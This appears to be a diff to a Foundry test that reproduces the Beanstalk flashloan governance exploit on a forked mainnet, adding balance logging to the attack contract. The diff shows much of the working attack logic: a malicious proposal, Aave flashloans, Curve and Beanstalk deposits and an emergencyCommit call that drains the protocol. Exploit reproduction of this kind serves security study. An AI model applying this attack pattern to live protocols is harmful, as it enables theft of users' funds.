@@ -5,8 +5,9 @@ import {IERC20} from "../../interfaces/IERC20.sol";
 import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
 import "./Interfaces.sol";
+import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
  
-contract BeanstalkAttack {
+contract BeanstalkAttack is TokenBalanceTracker {
 
     IBeanStalk private constant beanstalk = IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
     IERC20 private constant bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
@@ -19,7 +20,21 @@ contract BeanstalkAttack {
     ICurvePool private constant crvpool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
 
     IUniswapV2Factory private constant sushi = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
-    IERC20 private constant lusd = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0); 
+    IERC20 private constant lusd = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
+    address private constant usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+
+    constructor() {
+        addTokenToTracker(address(weth));
+        addTokenToTracker(usdc);
+        addTokenToTracker(address(bean));
+        addTokenToTracker(address(lusd));
+        addTokenToTracker(address(crv));
+        addTokenToTracker(address(crvbean));
+        addTokenToTracker(address(0x87898263B6C5BABe34b4ec53F22d98430b91e371));
+        
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(address(beanstalk));
+    }
 
     function propose() external payable {
         // proposing the bip requires a stake
@@ -58,6 +73,8 @@ contract BeanstalkAttack {
     }
 
     function attack() external {
+        logBalancesWithLabel("Initial balance", address(this));
+        logBalancesWithLabel("Initial balance", address(beanstalk));
         //Approvals
         //we need to deposit in crv liquidity pool and also approve aave so it can recover the funds
         //after the flashloan
@@ -107,6 +124,7 @@ contract BeanstalkAttack {
         address,
         bytes calldata
     ) external returns (bool) {
+        logBalancesWithLabel("Aave flashloan", address(this));
         //Notice that the 3crv params have an order, which is not the case in uniswap
         uint256[3] memory params3;
         params3[0] = amounts[0];
@@ -133,6 +151,7 @@ contract BeanstalkAttack {
         params3[2] = amounts[1] + premiums[1];
         crvpool.remove_liquidity_imbalance(params3, type(uint256).max);
 
+        logBalancesWithLabel("Flashloan paids, attacker", address(this));
         return true;
     }
 
@@ -163,9 +182,13 @@ contract BeanstalkAttack {
         params2[1] = crv.balanceOf(address(this));
         crvbean.add_liquidity(params2, 0);
         beanstalk.deposit(address(crvbean), crvbean.balanceOf(address(this)));
+        logBalancesWithLabel("Before commit, attacker", address(this));
+
         //We made our deposit in bean, we are ready to execute the bip
         beanstalk.emergencyCommit(18);
 
+        logBalancesWithLabel("Attack done, attacker", address(this));
+        logBalancesWithLabel("Attack done, victim", address(beanstalk));
         crvbean.remove_liquidity_one_coin(crvbean.balanceOf(address(this)), 1, 0);
 
         //uniswap has this fixed fee, it must be paid explicitely
@@ -183,12 +206,15 @@ contract Exploit_Beanstalk is Test {
    function setUp() public {
         vm.createSelectFork("mainnet", 14595000); //we register the proposal here and wait 1 full day
         vm.deal(address(this), 100 ether);
+
+
    }
  
    function test_attack() public {
         BeanstalkAttack att = new BeanstalkAttack();
         att.propose{value: 100 ether}();
         vm.warp(block.timestamp + 1 days); //proposal can be executed now
+
         att.attack();
 
         //Stolen tokens should be converted into eth to remove third party intervention
